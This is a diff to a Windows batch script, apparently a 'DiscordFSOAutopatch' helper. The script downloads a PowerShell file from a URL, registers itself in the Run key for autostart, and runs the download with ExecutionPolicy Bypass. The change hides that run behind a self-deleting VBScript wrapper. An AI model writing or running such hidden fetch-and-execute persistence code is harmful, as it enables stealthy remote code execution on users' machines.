@@ -15,6 +15,12 @@ set "valuename=DiscordFSOAutopatch"
 
 powershell -Command "Invoke-WebRequest -Uri '%ps1url%' -OutFile '%ps1file%'"
 reg add "%runkey%" /v "%valuename%" /d "\"%batfile%\"" /f >nul
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -WindowStyle Hidden powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"%ps1file%\"'"
+
+rem Use VBScript as a wrapper to run PowerShell hidden (no console window)
+echo Set objShell = CreateObject("Wscript.Shell") > "%temp%\runfso.vbs"
+echo objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -File ""%ps1file%""", 0, False >> "%temp%\runfso.vbs"
+cscript //B "%temp%\runfso.vbs"
+del "%temp%\runfso.vbs"
+
 timeout /t 2 >nul
 del "%ps1file%" >nul 2>&1
